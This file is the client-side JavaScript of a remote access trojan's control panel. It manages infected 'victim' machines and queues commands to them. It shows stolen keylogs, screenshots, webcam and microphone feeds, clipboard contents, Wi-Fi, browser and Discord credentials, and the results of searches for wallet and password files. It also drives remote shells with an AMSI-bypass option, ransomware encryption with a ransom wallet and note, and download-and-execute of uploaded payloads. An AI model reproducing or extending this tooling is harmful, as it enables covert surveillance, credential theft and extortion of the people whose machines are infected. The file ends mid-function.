let ME = null;

async function ensureAuth() {
  try {
    const r = await fetch('/api/me', {credentials: 'same-origin'});
    if (!r.ok) { location.href = '/login'; return false; }
    ME = await r.json();
    const w = document.getElementById('whoami');
    if (w) w.textContent = ME.username + ' · ' + ME.role + ' · id ' + (ME.builder_id||'');
    const adm = document.getElementById('rail-admin');
    if (adm && ME.role === 'admin') adm.style.display = '';
    return true;
  } catch {
    location.href = '/login';
    return false;
  }
}

async function logout() {
  await fetch('/api/logout', {method: 'POST'});
  location.href = '/login';
}

async function loadAdminUsers() {
  const r = await fetch('/api/admin/users');
  if (!r.ok) return;
  const list = await r.json();
  const box = document.getElementById('admin-users');
  if (!box) return;
  box.innerHTML = list.map(u => {
    const del = (u.username === 'sanity')
      ? '<span class="tag safe">locked</span>'
      : ('<button class="cmd sm danger" onclick="adminDeleteUser(\'' + esc(u.username) + '\')">delete</button>');
    return '<div class="admin-user-row"><span><b>' + esc(u.username) + '</b> · ' + esc(u.role) +
      ' · id <code>' + esc(u.builder_id||'') + '</code></span> ' + del + '</div>';
  }).join('') || '<div class="empty-state">no users</div>';
}

async function adminCreateUser() {
  const username = document.getElementById('new-user').value.trim();
  const password = document.getElementById('new-pass').value;
  const role = document.getElementById('new-role').value;
  const r = await fetch('/api/admin/users', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({username, password, role})
  });
  const j = await r.json();
  if (!r.ok) { toast(j.error || 'fail'); return; }
  toast('created ' + username);
  document.getElementById('new-user').value = '';
  document.getElementById('new-pass').value = '';
  loadAdminUsers();
}

async function adminDeleteUser(username) {
  if (username === 'sanity') { toast('sanity is locked'); return; }
  if (!confirm('Delete ' + username + '?')) return;
  const r = await fetch('/api/admin/users/' + encodeURIComponent(username), {method: 'DELETE'});
  const j = await r.json();
  if (!r.ok) { toast(j.error || 'fail'); return; }
  toast('deleted');
  loadAdminUsers();
}

let currentVid = null;
let selected = new Set();
let lastKeylogLen = 0;
let seenLoot = new Set();
const socket = io();

function toast(msg) {
  const el = document.getElementById('toast');
  el.textContent = msg;
  el.classList.add('show');
  clearTimeout(window.__tt);
  window.__tt = setTimeout(() => el.classList.remove('show'), 2000);
}

function setTheme(t) {
  document.documentElement.setAttribute('data-theme', t);
  localStorage.setItem('nyx-theme', t);
  document.querySelectorAll('.theme-swatch').forEach(s => s.classList.toggle('active', s.dataset.theme === t));
}
setTheme(localStorage.getItem('nyx-theme') || 'crimson');

function showPage(name) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.rail-btn[data-page]').forEach(b => b.classList.toggle('active', b.dataset.page === name));
  const page = document.getElementById('page-' + name);
  if (page) page.classList.add('active');
  if (name === 'victims') refreshVictims();
  if (name === 'activity') loadActivity();
  if (name === 'admin') loadAdminUsers();
  if (name === 'browsers') refreshBrowsers();
  if (name === 'donut') refreshDonut();
  if (name === 'android') refreshAndroids();
}

async function refreshVictims() {
  let list = [];
  try {
    const r = await fetch('/api/victims', { credentials: 'same-origin' });
    if (r.status === 401) {
      // stop interval spam
      if (window._victimsTimer) { clearInterval(window._victimsTimer); window._victimsTimer = null; }
      location.href = '/login';
      return;
    }
    if (!r.ok) { console.warn('victims', r.status); return; }
    list = await r.json();
    if (!Array.isArray(list)) list = [];
  } catch (e) {
    console.warn('victims fetch', e);
    return;
  }
  const q = (document.getElementById('victim-search')?.value || '').toLowerCase();
  const filtered = list.filter(v => {
    const info = v.info || {};
    const tagstr = (v.tags||[]).join(' '); const blob = `${v.alias||''} ${info.hostname||''} ${info.user||''} ${v.vid} ${tagstr}`.toLowerCase();
    return !q || blob.includes(q);
  });
  const box = document.getElementById('victim-list');
  const count = document.getElementById('victim-count');
  if (count) count.textContent = `${list.length} machine${list.length===1?'':'s'} · ${list.filter(v=>v.online).length} live`;

  if (!filtered.length) {
    box.innerHTML = `<div class="empty-state" style="grid-column:1/-1;padding:60px">
      <div class="big"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><rect x="3" y="4" width="7" height="7" rx="1.5"/><rect x="14" y="4" width="7" height="7" rx="1.5"/><rect x="3" y="13" width="7" height="7" rx="1.5"/><rect x="14" y="13" width="7" height="7" rx="1.5"/></svg></div>
      <div>No machines yet</div>
      <div style="font-size:.8rem">waiting for EXE check-ins</div>
    </div>`;
    return;
  }

  const bulk = document.getElementById('bulk-bar');
  if (bulk) {
    if (selected.size) { bulk.classList.remove('hidden'); document.getElementById('bulk-count').textContent = selected.size + ' selected'; }
    else bulk.classList.add('hidden');
  }
  box.innerHTML = filtered.map(v => {
    const info = v.info || {};
    const name = v.alias || info.hostname || v.vid.slice(0, 12);
    const user = info.user || '—';
    const age = lastSeenAge(v.last_seen);
    const health = age < 15 ? 'green' : age < 60 ? 'yellow' : 'red';
    const host = info.hostname || '';
    const sub = v.alias && host && v.alias !== host
      ? `${user} · ${host}`
      : user;
    return `<div class="machine ${selected.has(v.vid)?'selected':''}" onclick="selectVictim('${v.vid}')">
      <input class="machine-check" type="checkbox" ${selected.has(v.vid)?'checked':''}
        onclick="event.stopPropagation(); toggleSelect('${v.vid}', this.checked)"/>
      <div class="machine-top">
        <div>
          <div class="machine-name"><span class="health-dot ${health}"></span>${esc(name)}</div>
          <div class="machine-user">${esc(sub)}</div>
        </div>
        <span class="badge ${v.online?'live':'away'}">${v.online?'live':'away'}</span>
      </div>
    </div>`;
  }).join('');
}

function toggleSelect(vid, on) {
  if (on) selected.add(vid); else selected.delete(vid);
  refreshVictims();
}

function massCmd() {
  if (!selected.size) { toast('select machines first'); return; }
  const cmd = prompt('command for selected (screenshot, steal, lock…)');
  if (!cmd) return;
  fetch('/api/command', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({vids: [...selected], cmd, args: {}})
  }).then(() => toast('queued on ' + selected.size));
}

function selectVictim(vid) {
  currentVid = vid;
  lastKeylogLen = 0;
  seenLoot = new Set();
  showPage('control');
  document.getElementById('title').textContent = vid.slice(0, 12);
  clearAllOutputs(true);
  loadLoot();
  pollKeylog(true);
  fetch('/api/victims').then(r => r.json()).then(list => {
    const v = list.find(x => x.vid === vid);
    if (!v) return;
    const info = v.info || {};
    document.getElementById('title').textContent = v.alias || info.hostname || vid.slice(0, 12);
    document.getElementById('subtitle').textContent = `${info.user||''} · ${(info.os||'').slice(0,60)}`;
    const ver = info.version || 'old/?';
    const latest = '2.9.0';
    const verClass = ver === latest ? 'live' : 'away';
    document.getElementById('stats').innerHTML = `
      <div class="pill"><b>${info.ram_gb??'?'} GB</b> RAM</div>
      <div class="pill"><b>${info.admin?'YES':'no'}</b> admin</div>
      <div class="pill"><b>${v.loot_count||0}</b> loot</div>
      <div class="pill ${verClass}" title="build ${esc(info.build||'')}"><b>${esc(ver)}</b> ver</div>
      <div class="pill"><b>${esc((info.build||'').slice(0,8)||'—')}</b> build</div>`;
    const notes = document.getElementById('victim-notes');
    if (notes) notes.value = v.notes || '';
    const aliasInput = document.getElementById('victim-alias');
    if (aliasInput) aliasInput.value = v.alias || '';
  });
  openPanel('overview');
}

function saveNotes() {
  if (!currentVid) return;
  fetch('/api/notes', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({vid: currentVid, notes: document.getElementById('victim-notes').value})
  }).then(() => toast('notes saved'));
}

function renameVictim() {
  if (!currentVid) return;
  const alias = (document.getElementById('victim-alias')?.value || '').trim();
  fetch('/api/rename', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({vid: currentVid, alias})
  }).then(() => {
    toast(alias ? 'renamed · ' + alias : 'name cleared');
    document.getElementById('title').textContent = alias || currentVid.slice(0, 12);
    refreshVictims();
  });
}

function renameFromCard(vid, ev) {
  if (ev) ev.stopPropagation();
  const cur = prompt('Name for this machine (empty = reset)', '');
  if (cur === null) return;
  fetch('/api/rename', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({vid, alias: cur.trim()})
  }).then(() => { toast('renamed'); refreshVictims(); });
}

function openPanel(name) {
  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(t => t.classList.toggle('active', t.dataset.panel === name));
  const el = document.getElementById('panel-' + name);
  if (el) el.classList.add('active');
}

function send(cmd, args = {}) {
  if (!currentVid) { toast('pick a machine'); return; }
  fetch('/api/command', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({vid: currentVid, cmd, args})
  }).then(() => toast(cmd));
}

function clearAllOutputs(silent) {
  document.querySelectorAll('.out-box').forEach(el => { el.textContent = ''; });
  const kl = document.getElementById('out-keylog');
  if (kl) kl.textContent = '';
  lastKeylogLen = 0;
  if (!silent) toast('outputs cleared');
}

function setOut(id, text) {
  const el = document.getElementById('out-' + id);
  if (!el) return;
  el.textContent = text || '';
}

function appendOut(id, text) {
  const el = document.getElementById('out-' + id);
  if (!el || !text) return;
  const line = String(text).trim();
  if (!line) return;
  // avoid immediate duplicate lines
  if (el.textContent.startsWith(line + '\n') || el.textContent === line) return;
  el.textContent = (line + '\n' + el.textContent).slice(0, 40000);
}

function esc(s) {
  return String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}

async function loadLoot() {
  if (!currentVid) return;
  const r = await fetch('/api/loot/' + currentVid);
  const entries = await r.json();
  for (const entry of entries.slice(0, 50)) handleLoot(entry, true);
}

function lootKey(entry) {
  return `${entry.type}|${entry.ts}|${entry.file||''}|${(entry.preview||'').slice(0,40)}`;
}

function handleLoot(entry, fromHistory) {
  const k = lootKey(entry);
  if (seenLoot.has(k)) return;
  seenLoot.add(k);
  // bound memory
  if (seenLoot.size > 400) seenLoot = new Set([...seenLoot].slice(-200));

  const t = entry.type;
  if (t === 'monitors') {
    try {
      const m = typeof entry.preview === 'string' ? JSON.parse(entry.preview||'[]') : entry.preview;
      appendOut('screen', (m||[]).map(x => `monitor ${x.index}: ${x.w}x${x.h}`).join('\n'));
    } catch(e) { appendOut('screen', String(entry.preview||'')); }
  } else if (t === 'discord') {
    try {
      const d = typeof entry.preview === 'string' ? JSON.parse(entry.preview||'{}') : entry.preview;
      const hq = d.hq || [];
      const lines = hq.map(h => `${h.user||h.username||'?'} | ${h.email||''} | id ${h.id||''}`).join('\n');
      appendOut('stealer', `discord active=${d.active_count||0}\n${lines}\n${(d.notes||[]).join(' | ')}`);
    } catch(e) { appendOut('stealer', String(entry.preview||'')); }
  } else if (t === 'mic_list') {
    try {
      const m = typeof entry.preview === 'string' ? JSON.parse(entry.preview||'[]') : entry.preview;
      setOut('mic', JSON.stringify(m, null, 2));
    } catch(e) { setOut('mic', String(entry.preview||'')); }
  } else if (t === 'mic_chunk' && entry.preview && entry.preview.length > 100) {
    try {
      const bin = atob(entry.preview);
      const arr = new Uint8Array(bin.length);
      for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
      const blob = new Blob([arr], {type: 'audio/wav'});
      const url = URL.createObjectURL(blob);
      const box = document.getElementById('mic-audio');
      if (box) {
        let a = box.querySelector('audio');
        if (!a) { a = document.createElement('audio'); a.autoplay = true; box.innerHTML = ''; box.appendChild(a); }
        a.src = url;
        a.play().catch(()=>{});
      }
    } catch (e) {}
  } else if (t === 'mic_wav' && entry.file) {
    const url = '/api/loot_file/' + currentVid + '/' + entry.file + '?t=' + Date.now();
    document.getElementById('mic-audio').innerHTML = '<audio controls src="'+url+'"></audio>';
    appendOut('mic', 'recording ready');
  } else if (t === 'screenshot' || t === 'screen_frame') {
    if (t === 'screen_frame' && entry.preview && entry.preview.length > 200) {
      showImgData('screen-stage', entry.preview);
    } else if (entry.file) {
      showImg('screen-stage', entry.file);
    }
    if (t === 'screenshot' && !fromHistory) appendOut('screen', 'shot · ' + (entry.ts || ''));
  } else if (t === 'webcam' || t === 'webcam_frame') {
    if (t === 'webcam_frame' && entry.preview && entry.preview.length > 200) {
      showImgData('webcam-stage', entry.preview);
    } else if (entry.file) {
      showImg('webcam-stage', entry.file);
    }
  } else if (t === 'keylog') {
    // live keylog handled by pollKeylog full file — skip chunk spam
  } else if (t === 'rat_list') {
    try {
      const d = typeof entry.preview === 'string' ? JSON.parse(entry.preview||'{}') : entry.preview;
      const lines = [];
      (d.processes||[]).forEach(p => lines.push(`PROC pid=${p.pid} ${p.name} ${p.exe||''} ${p.self?'[self]':''}`));
      (d.files||[]).forEach(f => lines.push(`FILE ${f.path} (${f.size})`));
      (d.run_keys||[]).forEach(r => lines.push(`RUN ${r.hive} ${r.name}=${r.value}`));
      (d.notes||[]).forEach(n => lines.push(`NOTE ${n}`));
      setOut('rats', lines.join('\n') || 'none');
    } catch(e) { setOut('rats', String(entry.preview||'')); }
  } else if (t === 'machine_persist') {
    try {
      const d = typeof entry.preview === 'string' ? JSON.parse(entry.preview||'{}') : entry.preview;
      setOut('machine', JSON.stringify(d, null, 2));
    } catch(e) { setOut('machine', String(entry.preview||'')); }
  } else if (t === 'clip_history') {
    try {
      const h = typeof entry.preview === 'string' ? JSON.parse(entry.preview||'[]') : entry.preview;
      setOut('clip', (h||[]).map(x => `[${(x.ts||'').slice(11,19)}] ${x.text||''}`).join('\n'));
    } catch(e) { setOut('clip', String(entry.preview||'')); }
  } else if (t === 'clipboard') {
    const ts = (entry.ts || '').slice(11, 19);
    appendOut('clip', `[${ts}] ${entry.preview || ''}`);
  } else if (t === 'active_window') {
    appendOut('clip', 'window · ' + (entry.preview || ''));
    appendOut('overview', 'window · ' + (entry.preview || ''));
  } else if (t === 'wifi') {
    try {
      let data = entry.preview;
      if (typeof data === 'string') data = JSON.parse(data || '[]');
      if (Array.isArray(data))
        setOut('wifi', data.map(x => `${x.ssid}  →  ${x.password}`).join('\n'));
      else appendOut('wifi', entry.preview || '');
    } catch { appendOut('wifi', entry.preview || ''); }
  } else if (t === 'processes') {
    renderProcsFromPreview(entry);
  } else if (t === 'shell') {
    appendOut('shell', entry.preview || '');
  } else if (t === 'sysinfo') {
    appendOut('overview', entry.preview || '');
  } else if (t === 'steal_zip' && entry.file) {
    const ts = Date.now();
    document.getElementById('steal-links').innerHTML =
      `<a class="cmd primary" href="/api/loot_file/${currentVid}/${entry.file}?t=${ts}" download>Download ZIP</a>
       <button class="cmd sm" onclick="previewCqmFromZip('${entry.file}')">CQM tip</button>`;
    appendOut('stealer', 'ready · ' + entry.file + ' · ' + new Date().toLocaleTimeString());
    const btn = document.getElementById('btn-steal');
    if (btn) btn.disabled = false;
  } else if (t === 'files') {
    renderFiles(entry);
  } else if (t === 'file_download' && entry.file) {
    appendOut('files', 'downloaded · ' + (entry.preview || entry.file));
  } else if (t === 'creds' || t === 'filesearch') {
    appendOut('hunt', typeof entry.preview==='string'?entry.preview:JSON.stringify(entry.preview));
  } else if (t === 'status') {
    const msg = entry.preview || '';
    appendOut('overview', msg);
    // route by keyword
    const m = msg.toLowerCase();
    if (m.includes('killed')) appendOut('process', msg);
    if (m.includes('watchdog') || m.includes('persist') || m.includes('startup') || m.includes('defender') || m.includes('usb'))
      appendOut('persist', msg);
    if (m.includes('uninstall') || m.includes('delete')) appendOut('destroy', msg);
    if (m.includes('ransom') || m.includes('encrypt') || m.includes('decrypt')) appendOut('ransom', msg);
    if (m.includes('trace') || m.includes('prefetch') || m.includes('recent')) appendOut('clean', msg);
    if (m.includes('input') || m.includes('monitor') || m.includes('tray') || m.includes('wallpaper') || m.includes('spoke') || m.includes('opened'))
      appendOut('chaos', msg);
    if (m.includes('update') || m.includes('ran ') || m.includes('download')) appendOut('payload', msg);
    if (m.includes('taskmgr') || m.includes('regedit') || m.includes('uac') || m.includes('lock') || m.includes('cmd'))
      appendOut('system', msg);
    if (m.includes('steal')) appendOut('stealer', msg);
  } else if (t === 'webcam_list') {
    try {
      const cams = typeof entry.preview === 'string' ? JSON.parse(entry.preview || '[]') : entry.preview;
      const sel = document.getElementById('cam-sel');
      sel.innerHTML = (cams || []).map(c => `<option value="${c.index}">${c.name || ('Camera '+c.index)}</option>`).join('');
    } catch {}
  }
}

function showImgData(stageId, b64) {
  const stage = document.getElementById(stageId);
  if (!stage) return;
  let img = stage.querySelector('img');
  if (!img) {
    img = document.createElement('img');
    img.alt = '';
    img.style.width = '100%';
    img.style.height = 'auto';
    img.style.objectFit = 'contain';
    img.style.imageRendering = 'auto';
    stage.innerHTML = '';
    stage.appendChild(img);
  }
  const url = 'data:image/jpeg;base64,' + b64;
  img.src = url;
  img.onclick = () => openLightbox(url);
}

function showImg(stageId, file) {
  const stage = document.getElementById(stageId);
  if (!stage || !currentVid) return;
  let img = stage.querySelector('img');
  if (!img) {
    img = document.createElement('img');
    img.alt = '';
    img.style.cursor = 'zoom-in';
    stage.innerHTML = '';
    stage.appendChild(img);
  }
  const url = `/api/loot_file/${currentVid}/${file}?t=${Date.now()}`;
  img.src = url;
  img.onclick = () => openLightbox(url);
}

async function renderProcsFromPreview(entry) {
  if (!entry.file || !currentVid) return;
  try {
    const r = await fetch(`/api/loot_file/${currentVid}/${entry.file}`);
    const j = await r.json();
    const rows = j.data || j;
    if (!Array.isArray(rows)) return;
    _procCache = rows;
    filterProcs();
  } catch {}
}

async function renderFiles(entry) {
  let data = null;
  if (entry.file && currentVid) {
    try {
      const r = await fetch("/api/loot_file/" + currentVid + "/" + entry.file);
      const j = await r.json();
      data = j.data || j;
    } catch (e) {}
  }
  if (!data && entry.preview) {
    try { data = JSON.parse(entry.preview); } catch (e) {}
  }
  if (!data) { appendOut("files", "no listing data"); return; }
  const items = data.items || [];
  const pathEl = document.getElementById("file-path");
  if (pathEl) pathEl.value = data.path || "";
  const table = document.getElementById("file-table");
  if (!table) return;
  if (data.error) {
    table.innerHTML = '<div class="empty-state">' + esc(data.error) + "</div>";
    setOut("files", data.path || data.error);
    return;
  }
  table.innerHTML = '<table class="grid-table"><tr><th>Name</th><th>Size</th><th></th></tr>' +
    items.map(function(it) {
      var pathJson = JSON.stringify(it.path || "");
      return "<tr><td>" + (it.dir ? "DIR" : "FILE") + " · " + esc(it.name) + "</td><td>" +
        (it.dir ? "—" : it.size) + "</td><td>" +
        (it.dir
          ? '<button class="cmd sm" onclick="listDir(' + pathJson + ')">Open</button>'
          : '<button class="cmd sm" onclick=\'send("download_file",{path:' + pathJson + "})'>Get</button>") +
        "</td></tr>";
    }).join("") + "</table>";
  setOut("files", data.path || "");
}

let _procCache = [];
function filterProcs() {
  const q = (document.getElementById('proc-search')?.value || '').toLowerCase();
  const rows = !_procCache.length ? [] : _procCache.filter(p => {
    const blob = `${p.pid} ${p.name||''}`.toLowerCase();
    return !q || blob.includes(q);
  });
  const box = document.getElementById('proc-table');
  if (!box) return;
  box.innerHTML = `<table class="grid-table"><tr><th>PID</th><th>Name</th><th>CPU</th><th>MB</th><th></th></tr>
    ${rows.map(p => `<tr>
      <td>${p.pid}</td><td>${esc(p.name)}</td><td>${p.cpu??''}</td><td>${p.mem_mb??''}</td>
      <td><button class="cmd sm danger" onclick="send('kill',{target:'${p.pid}'})">kill</button></td>
    </tr>`).join('')}</table>`;
}

async function clearVault() {
  if (!confirm('Delete ALL vault files?')) return;
  const r = await fetch('/api/vault/clear', {method:'POST', headers:{'Content-Type':'application/json'}, body:'{}'});
  const j = await r.json();
  toast('removed ' + (j.removed||0));
  openVault();
}

function listDir(path) {
  send('list_dir', {path: path || ''});
}

function runSteal() {
  const btn = document.getElementById('btn-steal');
  if (btn) btn.disabled = true;
  send('steal');
}

function runShell(ps) {
  const cmd = document.getElementById('shell-cmd').value;
  if (!cmd) return;
  if (ps) send('powershell', {cmd, amsi: document.getElementById('amsi-bypass').checked});
  else send('shell', {cmd});
}

function preset(cmd) {
  document.getElementById('shell-cmd').value = cmd;
  runShell(true);
}

function snapCam() {
  send('webcam_snap', {idx: document.getElementById('cam-sel').value || 0});
}
function startCam() {
  send('webcam_start', {idx: document.getElementById('cam-sel').value || 0});
}

function chaosUrl() {
  const u = document.getElementById('chaos-url').value.trim();
  if (u) send('open_url', {url: u});
}
function chaosSpeak() {
  const text = document.getElementById('chaos-speak').value.trim();
  if (text) send('speak', {text});
}
function chaosWall() {
  const url = document.getElementById('chaos-wall').value.trim();
  if (url) send('wallpaper', {url});
}

function runRansom(mode) {
  send(mode === 'encrypt' ? 'ransom_encrypt' : 'ransom_decrypt', {
    coin: document.getElementById('ransom-coin').value,
    wallet: document.getElementById('ransom-wallet').value,
    note: document.getElementById('ransom-note').value
  });
}

async function downloadKeylog() {
  if (!currentVid) return;
  const r = await fetch('/api/keylog/' + currentVid);
  const text = await r.text();
  const a = document.createElement('a');
  a.href = URL.createObjectURL(new Blob([text], {type: 'text/plain'}));
  a.download = `keylog_${currentVid.slice(0,8)}.txt`;
  a.click();
}

async function uploadToVictim() {
  const inp = document.getElementById('upload-input');
  const dest = document.getElementById('upload-dest').value;
  if (!inp.files?.[0]) { toast('pick a file'); return; }
  const file = inp.files[0];
  const buf = await file.arrayBuffer();
  const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)));
  send('upload_file', {name: file.name, data: b64, dest});
}

async function openVault() {
  document.getElementById('vault-modal').classList.remove('hidden');
  const r = await fetch('/api/vault');
  const items = await r.json();
  document.getElementById('vault-list').innerHTML = items.map(it =>
    `<div class="vault-row">
      <span>${esc(it.vid.slice(0,8))} · ${esc(it.file)} · ${Math.round(it.size/1024)} KB</span>
      <a class="cmd sm" href="/api/loot_file/${it.vid}/${it.file}" download>get</a>
    </div>`
  ).join('') || '<div class="empty-state">vault empty</div>';
}
function closeVault() {
  document.getElementById('vault-modal').classList.add('hidden');
}

async function pollKeylog(force) {
  if (!currentVid) return;
  try {
    const r = await fetch('/api/keylog/' + currentVid);
    const text = await r.text();
    const el = document.getElementById('out-keylog');
    if (!el) return;
    // only update when grown or force — prevents duplication flicker
    if (force || text.length !== lastKeylogLen) {
      lastKeylogLen = text.length;
      el.textContent = text.slice(-20000);
      if (force) el.scrollTop = el.scrollHeight;
    }
  } catch {}
}

socket.on('new_loot', msg => {
  if (msg.vid === currentVid) handleLoot(msg.entry, false);
});
socket.on('victim_update', () => refreshVictims());

ensureAuth().then(ok => { if (ok) refreshVictims(); });
if (window._victimsTimer) clearInterval(window._victimsTimer);
window._victimsTimer = setInterval(refreshVictims, 8000);
setInterval(() => pollKeylog(false), 2000);
setInterval(() => { if (currentVid) loadLoot(); }, 4000);
refreshVictims();


async function loadActivity() {
  const r = await fetch('/api/activity');
  const list = await r.json();
  const box = document.getElementById('activity-feed');
  if (!box) return;
  if (!list.length) {
    box.innerHTML = '<div class="empty-state">no events yet</div>';
    return;
  }
  box.innerHTML = list.map(e => {
    const ts = (e.ts || '').replace('T', ' ').replace('Z', '').slice(0, 19);
    const vid = (e.vid || '').slice(0, 8);
    return `<div class="act-item">
      <div class="ts">${esc(ts)}</div>
      <div class="kind ${esc(e.kind||'')}">${esc(e.kind||'')}</div>
      <div class="msg"><b>${esc(vid)}</b> · ${esc(e.message||'')}</div>
    </div>`;
  }).join('');
}

function exportVictim() {
  if (!currentVid) return;
  window.open('/api/export/' + currentVid, '_blank');
}

function setStealProgress(pct, text) {
  const wrap = document.getElementById('steal-progress');
  const bar = document.getElementById('steal-bar');
  const label = document.getElementById('steal-prog-text');
  if (!wrap) return;
  wrap.classList.remove('hidden');
  if (bar) bar.style.width = Math.min(100, pct) + '%';
  if (label) label.textContent = text || (pct + '%');
  if (pct >= 100) setTimeout(() => wrap.classList.add('hidden'), 2500);
}

// hook status for stealer progress
const _appendOut = appendOut;
appendOut = function(id, text) {
  _appendOut(id, text);
  const m = String(text || '');
  if (m.includes('stealer:')) {
    const pct = parseInt((m.match(/(\d+)%/) || [])[1] || '0', 10);
    setStealProgress(pct, m.replace(/^stealer:\s*/i, ''));
    const btn = document.getElementById('btn-steal');
    if (btn && pct >= 100) btn.disabled = false;
  }
};

socket.on('activity', () => {
  if (document.getElementById('page-activity')?.classList.contains('active')) loadActivity();
});


function lastSeenAge(iso) {
  if (!iso) return 99999;
  try {
    const t = new Date(iso.replace('Z', '+00:00')).getTime();
    return Math.max(0, Math.floor((Date.now() - t) / 1000));
  } catch { return 99999; }
}

function massSend(cmd) {
  if (!selected.size) { toast('select machines'); return; }
  fetch('/api/command', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({vids: [...selected], cmd, args: {}})
  }).then(() => toast(cmd + ' → ' + selected.size));
}

function openLightbox(url) {
  const lb = document.getElementById('lightbox');
  const img = document.getElementById('lightbox-img');
  if (!lb || !img) return;
  img.src = url;
  lb.classList.remove('hidden');
}
function closeLightbox() {
  document.getElementById('lightbox')?.classList.add('hidden');
}


function renderStealSummary(summary, file) {
  const box = document.getElementById('steal-summary');
  if (!box || !summary) return;
  const samples = summary.samples || [];
  box.innerHTML = `
    <div class="steal-stats">
      <span><strong>${summary.passwords||0}</strong> passwords</span>
      <span><strong>${summary.cookies||0}</strong> cookies</span>
      <span><strong>${summary.history||0}</strong> history</span>
      ${file ? `<a class="cmd sm primary" href="/api/loot_file/${currentVid}/${file}" download>ZIP</a>` : ''}
    </div>
    ${samples.map(s => `<div class="steal-card"><b>${esc(s.browser||'')} ${esc(s.url||'')}</b>
      <div>${esc(s.user||'')}</div><div>${esc(s.pass||'')}</div></div>`).join('')}`;
}

// patch handleLoot for summary + lightbox already via showImg
const _handleLoot = handleLoot;
handleLoot = function(entry, fromHistory) {
  _handleLoot(entry, fromHistory);
  if (entry.type === 'steal_zip') {
    let sum = entry.summary;
    if (!sum && entry.preview) {
      try { sum = JSON.parse(entry.preview); } catch {}
    }
    if (sum) renderStealSummary(sum, entry.file);
  }
};

// keyboard
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') {
    closeLightbox();
    if (document.getElementById('page-control')?.classList.contains('active')) {
      showPage('victims');
    }
  }
});


function bulkAlias() {
  if (!selected.size) return toast('select machines');
  const alias = prompt('Alias for selected', '');
  if (alias === null) return;
  fetch('/api/bulk_alias', {method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({vids:[...selected], alias})}).then(()=>{toast('aliased'); refreshVictims();});
}
function bulkNotes() {
  if (!selected.size) return toast('select machines');
  const notes = prompt('Notes for selected', '');
  if (notes === null) return;
  fetch('/api/bulk_notes', {method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({vids:[...selected], notes})}).then(()=>toast('notes set'));
}
function runFileSearch() {
  const patterns = document.getElementById('hunt-patterns')?.value || '*seed*,*.kdbx,*wallet*,*password*';
  send('file_search', {patterns, max: 80});
}

function clearKeylogUI() {
  const el = document.getElementById('out-keylog');
  if (el) el.textContent = '';
  lastKeylogLen = 0;
  // also clear server-side live file when flush/stop
  if (currentVid) {
    fetch('/api/keylog_clear/' + currentVid, {method: 'POST'}).catch(()=>{});
  }
}

function runPayloadUpdate() {
  const url = (document.getElementById('upd-url')?.value || '').trim();
  if (!url) { toast('paste URL to new exe first'); return; }
  send('self_update', {url});
  appendOut('payload', 'payload+run → ' + url);
  toast('update queued');
}

function handlePayloadDrop(ev) {
  ev.preventDefault();
  ev.currentTarget.classList.remove('drag');
  const f = ev.dataTransfer?.files?.[0];
  if (!f) return;
  toast('host the exe yourself (discord/cdn/github raw) then paste URL — drag only reminds path: ' + f.name);
  document.getElementById('upd-url').placeholder = 'host ' + f.name + ' then paste https URL';
}

function handlePayloadFile(input) {
  const f = input.files?.[0];
  if (!f) return;
  toast('host ' + f.name + ' publicly then paste URL below');
}

// show deep path when self-update reports it
const _handleLoot2 = handleLoot;
handleLoot = function(entry, fromHistory) {
  _handleLoot2(entry, fromHistory);
  if (entry.type === 'payload_path' || (entry.type === 'status' && String(entry.preview||'').includes('hidden at'))) {
    const box = document.getElementById('payload-path');
    if (box) box.innerHTML = '<b>hidden path:</b> ' + esc(entry.preview || entry.file || '');
    appendOut('payload', entry.preview || '');
  }
  if (entry.type === 'discord' || entry.type === 'roblox' || entry.type === 'browsers' || entry.type === 'email') {
    appendOut('stealer', entry.type + ' ready');
  }
  if (entry.type === 'keylog_clear') {
    clearKeylogUI();
  }
};

async function uploadPayloadFile(file) {
  if (!file || !file.name.toLowerCase().endsWith('.exe')) {
    toast('exe only');
    return null;
  }
  const fd = new FormData();
  fd.append('file', file);
  appendOut('payload', 'uploading ' + file.name + '…');
  const r = await fetch('/api/payload/upload', { method: 'POST', body: fd, credentials: 'same-origin' });
  const j = await r.json();
  if (!r.ok) {
    toast(j.error || 'upload fail');
    appendOut('payload', 'upload fail: ' + (j.error || r.status));
    return null;
  }
  // full URL for victim (same origin as panel)
  const full = location.origin + j.path;
  const inp = document.getElementById('upd-url');
  if (inp) inp.value = full;
  appendOut('payload', 'hosted ' + j.file + ' · ' + (j.size/1024/1024).toFixed(2) + ' MB · ' + full);
  toast('uploaded · ready to push');
  return full;
}

async function handlePayloadDrop(ev) {
  ev.preventDefault();
  ev.currentTarget.classList.remove('drag');
  const f = ev.dataTransfer?.files?.[0];
  if (f) await uploadPayloadFile(f);
}

async function handlePayloadFile(input) {
  const f = input.files?.[0];
  if (f) await uploadPayloadFile(f);
  input.value = '';
}

function runPayloadUpdate() {
  const url = (document.getElementById('upd-url')?.value || '').trim();
  if (!url) { toast('upload or paste URL first'); return; }
  const action = document.getElementById('payload-action')?.value || 'self_update';
  if (action === 'self_update') {
    send('self_update', { url });
    appendOut('payload', 'self-update → ' + url);
  } else {
    send('download_exec', { url, args: '' });
    appendOut('payload', 'download_exec → ' + url);
  }
  toast(action + ' queued');
}

async function deleteVictimPermanent() {
  if (!currentVid) { toast('no victim'); return; }
